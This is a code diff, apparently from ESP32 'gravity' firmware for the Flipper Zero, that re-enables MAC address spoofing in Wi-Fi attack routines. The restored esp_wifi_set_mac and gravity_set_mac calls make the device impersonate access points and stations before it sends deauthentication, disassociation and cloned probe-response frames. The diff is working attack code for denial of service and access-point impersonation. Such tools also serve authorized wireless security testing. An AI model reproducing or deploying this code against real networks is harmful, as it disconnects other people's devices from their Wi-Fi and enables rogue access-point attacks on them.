@@ -94,14 +94,14 @@ esp_err_t dosSendDeauth(uint8_t *srcAddr, uint8_t *destAddr, ScanResultAP *thisA
             #endif
         #endif
         /* Set MAC to deauthSrc */
-// TODO: Fix MAC spoofing
-        // if (esp_wifi_set_mac(ESP_IF_WIFI_AP, deauthSrc) != ESP_OK) {
-        //     #ifdef CONFIG_FLIPPER
-        //         printf("Failed to set MAC for DOS Deauth, continuing\n");
-        //     #else
-        //         ESP_LOGW(DOS_TAG, "Failed to set MAC (%02x:%02x:%02x:%02x:%02x:%02x) for DOS Deauth", deauthSrc[0], deauthSrc[1], deauthSrc[2], deauthSrc[3], deauthSrc[4], deauthSrc[5]);
-        //     #endif
-        // }
+        if (esp_wifi_set_mac(ESP_IF_WIFI_AP, deauthSrc) != ESP_OK) {
+            #ifdef CONFIG_FLIPPER
+                printf("Failed to set MAC for DOS Deauth, continuing\n");
+            #else
+                ESP_LOGW(DOS_TAG, "Failed to set MAC (%02x:%02x:%02x:%02x:%02x:%02x) for DOS Deauth", deauthSrc[0], deauthSrc[1], deauthSrc[2], deauthSrc[3], deauthSrc[4], deauthSrc[5]);
+            #endif
+        }
+        vTaskDelay(1);
 
         #ifdef CONFIG_DEBUG_VERBOSE
             #ifdef CONFIG_FLIPPER
@@ -115,14 +115,14 @@ esp_err_t dosSendDeauth(uint8_t *srcAddr, uint8_t *destAddr, ScanResultAP *thisA
         deauth_standalone_packet(deauthSrc, deauthDest);
         /* Now set the MAC to STA's and send disassoc to AP */
         /* Check if it's broadcast first */
-// TODO: Re-implement MAC spoofing
-        // if (memcmp(deauthDest, BROADCAST, 6) && esp_wifi_set_mac(ESP_IF_WIFI_AP, deauthDest) != ESP_OK) {
-        //     #ifdef CONFIG_FLIPPER
-        //         printf("Failed to set MAC for disassoc, continuing\n");
-        //     #else
-        //         ESP_LOGW(DOS_TAG, "Failed to set MAC (%02x:%02x:%02x:%02x:%02x:%02x) for DOS Deauth", deauthDest[0], deauthDest[1], deauthDest[2], deauthDest[3], deauthDest[4], deauthDest[5]);
-        //     #endif
-        // }
+        if (memcmp(deauthDest, BROADCAST, 6) && esp_wifi_set_mac(ESP_IF_WIFI_AP, deauthDest) != ESP_OK) {
+            #ifdef CONFIG_FLIPPER
+                printf("Failed to set MAC for disassoc, continuing\n");
+            #else
+                ESP_LOGW(DOS_TAG, "Failed to set MAC (%02x:%02x:%02x:%02x:%02x:%02x) for DOS Deauth", deauthDest[0], deauthDest[1], deauthDest[2], deauthDest[3], deauthDest[4], deauthDest[5]);
+            #endif
+        }
+        vTaskDelay(1);
         #ifdef CONFIG_DEBUG_VERBOSE
             #ifdef CONFIG_FLIPPER
                 printf("Disassoc to %s\n", strSrc);
@@ -135,14 +135,14 @@ esp_err_t dosSendDeauth(uint8_t *srcAddr, uint8_t *destAddr, ScanResultAP *thisA
         /* Packet goes to or from a scanned station */
         /* In this instance we'll deauth both the identified and unknown STAs */
         /* Set the MAC first this time */
-// TODO re-implement MAC spoofing
-        // if (esp_wifi_set_mac(ESP_IF_WIFI_AP, thisSTA->apMac) != ESP_OK) {
-        //     #ifdef CONFIG_FLIPPER
-        //         printf("Failed to set MAC in DOS STA\n");
-        //     #else
-        //         ESP_LOGW(DOS_TAG, "Failed to set MAC in DOS STA\n");
-        //     #endif
-        // }
+        if (esp_wifi_set_mac(ESP_IF_WIFI_AP, thisSTA->apMac) != ESP_OK) {
+            #ifdef CONFIG_FLIPPER
+                printf("Failed to set MAC in DOS STA\n");
+            #else
+                ESP_LOGW(DOS_TAG, "Failed to set MAC in DOS STA\n");
+            #endif
+        }
+        vTaskDelay(1);
         for (int z = 0; z < 2; ++z) {
             if (z == 0) {
                 memcpy(deauthSrc, srcAddr, 6);
@@ -235,26 +235,26 @@ esp_err_t cloneProbeRequest(uint8_t *payload) {
             ESP_LOGI(DOS_TAG, "AP record and destAddr %s do not match", destStr);
         }
         /* Set MAC */
-// TODO: Re-implement MAC spoofing
-        // if (gravity_set_mac(destAddr) != ESP_OK) {
-        //     #ifdef CONFIG_FLIPPER
-        //         printf("Unable to set MAC to %s\n", strSsid);
-        //     #else
-        //         ESP_LOGW(DOS_TAG, "Unable to set MAC to %s", strSsid);
-        //     #endif
-        // }
+        if (gravity_set_mac(destAddr) != ESP_OK) {
+            #ifdef CONFIG_FLIPPER
+                printf("Unable to set MAC to %s\n", strSsid);
+            #else
+                ESP_LOGW(DOS_TAG, "Unable to set MAC to %s", strSsid);
+            #endif
+        }
+        vTaskDelay(1);
         send_probe_response(destAddr, srcAddr, strSsid, AUTH_TYPE_NONE, 0); // TODO: Decide on AUTH approach
     } else {
         for (i = 0; i < gravity_sel_ap_count; ++i) {
             // TODO: AUTH
-// TODO: Re-implement MAC spoofing
-            // if (gravity_set_mac(gravity_selected_aps[i]->espRecord.bssid) != ESP_OK) {
-            //     #ifdef CONFIG_FLIPPER
-            //         printf("Unable to set MAC from selectedAP\n");
-            //     #else
-            //         ESP_LOGW(DOS_TAG, "Unable to set MAC from selectedAP");
-            //     #endif
-            // }
+            if (gravity_set_mac(gravity_selected_aps[i]->espRecord.bssid) != ESP_OK) {
+                #ifdef CONFIG_FLIPPER
+                    printf("Unable to set MAC from selectedAP\n");
+                #else
+                    ESP_LOGW(DOS_TAG, "Unable to set MAC from selectedAP");
+                #endif
+            }
+            vTaskDelay(1);
             send_probe_response(gravity_selected_aps[i]->espRecord.bssid, srcAddr, (char *)gravity_selected_aps[i]->espRecord.ssid, AUTH_TYPE_NONE, 0);
         }
     }
